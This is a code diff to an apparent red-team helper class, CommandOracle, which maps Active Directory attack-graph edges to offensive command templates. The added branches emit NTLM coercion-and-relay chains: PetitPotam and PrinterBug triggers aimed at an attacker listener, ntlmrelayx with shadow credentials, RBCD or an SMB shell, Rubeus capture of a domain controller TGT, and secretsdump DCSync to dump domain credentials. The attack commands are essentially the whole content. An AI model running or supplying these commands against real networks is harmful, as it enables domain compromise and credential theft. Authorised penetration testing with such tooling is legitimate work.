@@ -219,6 +219,53 @@ class CommandOracle:
                 "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
             )
 
+        if normalized_edge == "CoerceAndRelayNTLMToLDAP":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# CoerceAndRelayNTLMToLDAP: WebClient-based coercion relayed to LDAP on a DC without LDAP signing\n"
+                "ntlmrelayx.py -t ldap://<DOMAIN_CONTROLLER_IP> --shadow-credentials --shadow-target '<TARGET_COMPUTER>$'\n"
+                "# Alternative follow-up: use --delegate-access for RBCD instead of shadow credentials\n"
+                "# Trigger coercion from the target computer to your listener\n"
+                f"petitpotam.py -d '{domain}' -u '{username}' -p '<PASSWORD>' '<ATTACKER_NETBIOS>@<PORT>/file.txt' '{target_host}'\n"
+                "# Authenticate with the generated certificate or continue with the RBCD chain"
+            )
+
+        if normalized_edge == "CoerceAndRelayNTLMToLDAPS":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# CoerceAndRelayNTLMToLDAPS: WebClient-based coercion relayed to LDAPS on a DC without channel binding\n"
+                "ntlmrelayx.py -t ldaps://<DOMAIN_CONTROLLER_IP> --shadow-credentials --shadow-target '<TARGET_COMPUTER>$'\n"
+                "# Alternative follow-up: use --delegate-access for RBCD instead of shadow credentials\n"
+                "# Trigger coercion from the target computer to your listener\n"
+                f"petitpotam.py -d '{domain}' -u '{username}' -p '<PASSWORD>' '<ATTACKER_NETBIOS>@<PORT>/file.txt' '{target_host}'\n"
+                "# Authenticate with the generated certificate or continue with the RBCD chain"
+            )
+
+        if normalized_edge == "CoerceAndRelayNTLMToSMB":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# CoerceAndRelayNTLMToSMB: coerce a victim computer and relay its NTLM auth to SMB on a signing-disabled target\n"
+                f"ntlmrelayx.py -t smb://{target_host} -smb2support\n"
+                "# Trigger coercion from a machine that is admin on the target\n"
+                "printerbug.py '<DOMAIN>/<USER>:<PASSWORD>'@<VICTIM_COMPUTER_IP> <ATTACKER_IP>\n"
+                "# If the relay succeeds, use the relayed shell or SMB session to execute commands on the target"
+            )
+
+        if normalized_edge == "CoerceToTGT":
+            target_domain = target.name or target.id or "<TARGET_DOMAIN>"
+            return (
+                "# CoerceToTGT: abuse unconstrained delegation to capture a Tier Zero TGT, then DCSync\n"
+                "# 1) On the unconstrained-delegation host, monitor for incoming TGTs\n"
+                "Rubeus.exe request monitor /user:<TARGET_DC_DNS_NAME> /interval:5 /nowrap\n"
+                "# 2) Coerce the DC or other Tier Zero principal to authenticate to the compromised host\n"
+                "printerbug.py '<DOMAIN>/<USER>:<PASSWORD>'@<TARGET_DC_IP> <COMPROMISED_HOST_IP>\n"
+                "# 3) Convert/inject the captured ticket and use it for replication\n"
+                "ticketConverter.py ticket.kirbi ticket.ccache\n"
+                "export KRB5CCNAME=$PWD/ticket.ccache\n"
+                f"secretsdump.py -k -just-dc-user <DOMAIN/TARGETUSER> <TARGET_DC_DNS>\n"
+                f"# Target domain: {target_domain}"
+            )
+
         # AddAllowedToAct / AllowedToAct (RBCD write primitive)
         if normalized_edge in ("AddAllowedToAct", "AllowedToAct"):
             target_computer = target.name or "<TARGET_COMPUTER>"
